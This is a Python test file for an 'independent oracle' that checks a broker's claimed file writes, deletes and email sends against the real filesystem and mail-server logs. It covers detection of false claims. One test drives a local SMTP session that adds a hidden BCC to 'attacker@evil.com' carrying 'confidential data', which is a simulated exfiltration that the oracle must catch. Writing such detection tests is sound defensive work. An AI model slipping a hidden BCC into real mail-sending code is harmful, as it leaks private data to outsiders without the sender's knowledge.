"""Tests for the independent evaluation oracle

The oracle re-derives "did this effect actually happen?" from EXTERNAL sources
(real filesystem, real SMTP/MTA log) — never the broker's store or ledger.

These tests demonstrate:
  1. A real on-disk write is confirmed by the oracle.
  2. A ledger claim for a file that was NOT actually written is REFUTED
     (observed=False, matches=False) — the oracle catches a lying ledger.
  3. A real delete is confirmed (file absent).
  4. A real SMTP log reveals a hidden BCC recipient the ledger did not declare.
  5. (aiosmtpd) A real MTA log, captured end-to-end, is consumed by the oracle.
"""

from __future__ import annotations

import os

import pytest

from effect_broker.oracle import IndependentOracle


class TestIndependentOracleRealFS:
    """Oracle verifies writes/deletes against the REAL filesystem."""

    def test_real_write_confirmed(self, tmp_path: str) -> None:
        oracle = IndependentOracle()
        target = os.path.join(tmp_path, "out.txt")
        with open(target, "wb") as f:
            f.write(b"real bytes")

        v = oracle.verify_write(target, expected_bytes=b"real bytes", claimed=True)
        assert v.observed is True, "Real on-disk file must be observed by the oracle"
        assert v.matches is True, "Claimed + observed write must be consistent"
        assert v.detail == "content-match"

    def test_false_claim_refuted_when_file_absent(self, tmp_path: str) -> None:
        """A ledger claiming a write that never happened must be refuted.

        This is the core oracle property: the broker/ledger says 'write X
        succeeded' but the file is NOT on disk. The oracle (reading disk)
        must report observed=False and matches=False.
        """
        oracle = IndependentOracle()
        missing = os.path.join(tmp_path, "never-written.txt")
        assert not os.path.exists(missing)

        # The ledger CLAIMS this write happened (claimed=True) but it didn't.
        v = oracle.verify_write(missing, expected_bytes=b"lie", claimed=True)
        assert v.claimed is True
        assert v.observed is False, "Oracle must see the file is absent on disk"
        assert v.matches is False, "Claim contradicted by reality -> refuted"

    def test_content_mismatch_refuted(self, tmp_path: str) -> None:
        """Claimed content that differs from on-disk content is a mismatch."""
        oracle = IndependentOracle()
        target = os.path.join(tmp_path, "wrong.txt")
        with open(target, "wb") as f:
            f.write(b"actual")

        v = oracle.verify_write(target, expected_bytes=b"expected", claimed=True)
        assert v.matches is False, "Content mismatch must be flagged"
        assert v.detail == "content-mismatch"

    def test_real_delete_confirmed(self, tmp_path: str) -> None:
        oracle = IndependentOracle()
        target = os.path.join(tmp_path, "doomed.txt")
        with open(target, "wb") as f:
            f.write(b"bye")
        os.remove(target)

        v = oracle.verify_delete(target, claimed=True)
        assert v.observed is True, "Absent file = delete observed"
        assert v.matches is True

    def test_delete_refuted_when_file_still_present(self, tmp_path: str) -> None:
        oracle = IndependentOracle()
        target = os.path.join(tmp_path, "still-there.txt")
        with open(target, "wb") as f:
            f.write(b"still here")

        v = oracle.verify_delete(target, claimed=True)
        assert v.observed is False, "File still present -> delete NOT observed"
        assert v.matches is False

    def test_cross_check_refutes_lie_among_many(self, tmp_path: str) -> None:
        """cross_check over several claimed effects flags only the false one."""
        oracle = IndependentOracle()
        good = os.path.join(tmp_path, "good.txt")
        with open(good, "wb") as f:
            f.write(b"good")
        lie = os.path.join(tmp_path, "lie.txt")  # never written

        verdicts = oracle.cross_check(
            [("write", good), ("write", lie)],
            expected_bytes={good: b"good", lie: b"lie"},
        )
        by_target = {v.target: v for v in verdicts}
        assert by_target[good].matches is True
        assert by_target[lie].matches is False
        assert oracle.is_consistent(verdicts) is False


class TestIndependentOracleSmtp:
    """Oracle verifies sends against the real MTA SMTP log."""

    def test_send_confirmed_from_log(self) -> None:
        oracle = IndependentOracle(smtp_log=[("internal@corp.com", b"msg")])
        v = oracle.verify_send("internal@corp.com", claimed=True)
        assert v.observed is True and v.matches is True

    def test_send_refuted_when_not_delivered(self) -> None:
        """Ledger claims a send, but the MTA log shows no delivery -> refuted."""
        oracle = IndependentOracle(smtp_log=[])
        v = oracle.verify_send("internal@corp.com", claimed=True)
        assert v.claimed is True
        assert v.observed is False, "No delivery in the real MTA log"
        assert v.matches is False, "Claimed send not in MTA log -> refuted"

    def test_hidden_bcc_detected(self) -> None:
        """A recipient in the MTA log that was not declared -> hidden BCC."""
        oracle = IndependentOracle(
            smtp_log=[("internal@corp.com", b"msg"), ("attacker@evil.com", b"msg")]
        )
        v = oracle.verify_hidden_recipients(frozenset({"internal@corp.com"}))
        assert v.matches is False, "Undeclared recipient in MTA log must be flagged"
        assert "hidden-recipients" in v.detail


@pytest.mark.skipif(
    pytest.importorskip("aiosmtpd") is None, reason="aiosmtpd not installed"
)
class TestIndependentOracleRealMta:
    """End-to-end: real aiosmtpd handler log feeds the oracle (no probe patching)."""

    def test_real_mta_log_refutes_undeclared_bcc(self) -> None:
        """Real MTA accepts a hidden BCC; the oracle (reading the MTA log)
        detects it even though the ledger declared only the primary."""
        import socket
        import threading

        from aiosmtpd.controller import Controller

        handler_state: dict[str, list] = {"rcpt": [], "data": []}

        class _Handler:
            def __init__(self) -> None:
                self._lock = threading.Lock()

            async def handle_RCPT(self, session, envelope, *args):
                with self._lock:
                    if len(args) >= 2:
                        address = args[1]
                        handler_state["rcpt"].append(address)
                        if hasattr(session, "envelope"):
                            session.envelope.rcpt_tos.append(address)
                return "250 OK"

            async def handle_DATA(self, session, envelope, *args):
                with self._lock:
                    content = (
                        getattr(session.envelope, "content", b"")
                        if hasattr(session, "envelope")
                        else b""
                    )
                    handler_state["data"].append(content)
                return "250 OK"

            async def handle_RSET(self, session, envelope, *args):
                # RSET clears the MTA envelope but NOT our out-of-band log.
                return "250 OK"

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 0))
            _, port = s.getsockname()

        controller = Controller(handler=_Handler(), hostname="127.0.0.1", port=port)
        controller.start()
        try:
            # Drive the SMTP dialogue over a raw socket (full control over the
            # wire; the MTA is a real aiosmtpd process). This is the same
            # permissive-MTA pattern as the BCC tests.
            def _read_reply(sock):
                # Read a full SMTP reply (possibly multi-line "250-...250").
                buf = b""
                while b"\r\n" not in buf:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    buf += chunk
                    # A multi-line reply ends at a line starting "NNN " (code+space).
                    last = buf.rsplit(b"\r\n", 1)[-1]
                    if len(last) >= 4 and last[0:3].isdigit() and last[3:4] == b" ":
                        break
                return buf

            with socket.create_connection(("127.0.0.1", port), timeout=5.0) as c:
                _read_reply(c)  # 220 greeting
                c.sendall(b"EHLO test\r\n")
                _read_reply(c)  # multi-line EHLO
                c.sendall(b"MAIL FROM:<tool@corp.com>\r\n")
                _read_reply(c)
                c.sendall(b"RCPT TO:<internal@corp.com>\r\n")
                _read_reply(c)
                c.sendall(b"RCPT TO:<attacker@evil.com>\r\n")  # hidden BCC
                _read_reply(c)
                c.sendall(b"DATA\r\n")
                _read_reply(c)  # 354
                c.sendall(b"subject: exfil\r\n\r\nconfidential data\r\n.\r\n")
                _read_reply(c)  # 250 queued
                c.sendall(b"QUIT\r\n")
                try:
                    _read_reply(c)
                except OSError:
                    pass
        finally:
            controller.stop()

        # Build the out-of-band MTA log (rcpt, data) from the real handler state.
        mta_log = list(zip(handler_state["rcpt"], [b""] * len(handler_state["rcpt"]), strict=False))
        oracle = IndependentOracle(smtp_log=mta_log)

        # The ledger declared only the primary. The oracle sees the BCC.
        v = oracle.verify_hidden_recipients(frozenset({"internal@corp.com"}))
        assert v.matches is False, (
            "Oracle must detect the hidden BCC from the REAL MTA log "
            f"(got detail={v.detail})"
        )
        assert "attacker@evil.com" in v.detail
